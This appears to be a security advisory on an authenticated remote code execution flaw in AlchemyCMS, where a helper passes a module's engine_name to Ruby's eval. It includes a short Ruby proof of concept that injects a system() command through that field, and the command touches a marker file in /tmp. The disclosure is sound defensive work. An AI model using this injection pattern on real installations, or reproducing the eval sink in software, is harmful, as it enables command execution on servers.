summary: "AlchemyCMS: Authenticated Remote Code Execution (RCE) via eval injection in ResourcesHelper\n\
  ### Summary\nA vulnerability was discovered during a manual security audit of the AlchemyCMS\
  \ source code. The application uses the Ruby `eval()` function to dynamically execute a string\
  \ provided by the `resource_handler.engine_name` attribute in `Alchemy::ResourcesHelper#resource_url_proxy`.\n\
  \n### Details\nThe vulnerability exists in `app/helpers/alchemy/resources_helper.rb` at line\
  \ 28. The code explicitly bypasses security linting with `# rubocop:disable Security/Eval`,\
  \ indicating that the use of a dangerous function was known but not properly mitigated. \n\
  \nSince `engine_name` is sourced from module definitions that can be influenced by administrative\
  \ configurations, it allows an authenticated attacker to escape the Ruby sandbox and execute\
  \ arbitrary system commands on the host OS.\n\nBut, for this attack to be possible local file\
  \ access to the alchemy project or the source on a remote server is necessary in order to\
  \ manipulate the module config file, though.\n\n### PoC (Proof of Concept)\nThe following\
  \ standalone Ruby script demonstrates that the `eval` sink is directly exploitable:\n\n```ruby\n\
  require 'ostruct'\n\ndef resource_url_proxy(resource_handler)\n  if resource_handler.engine_name\
  \ && !resource_handler.engine_name.empty?\n    eval(resource_handler.engine_name)\n  end\n\
  end\n\n# Payload to create a file in /tmp directory\npayload = \"system('touch /tmp/alchemy_rce_verified');\
  \ 'main_app'\"\nhandler = OpenStruct.new(engine_name: payload)\n\nresource_url_proxy(handler)\n\
  \nif File.exist?('/tmp/alchemy_rce_verified')\n  puts \"RCE Verified: Command executed successfully.\"\
  \nend\n```\n\n\n<img width=\"1909\" height=\"885\" alt=\"Screenshot From 2026-01-17 15-49-01\"\
  \ src=\"https://github.com/user-attachments/assets/07929d46-c839-4d3c-9b74-916bd87819ad\"\
  \ />"
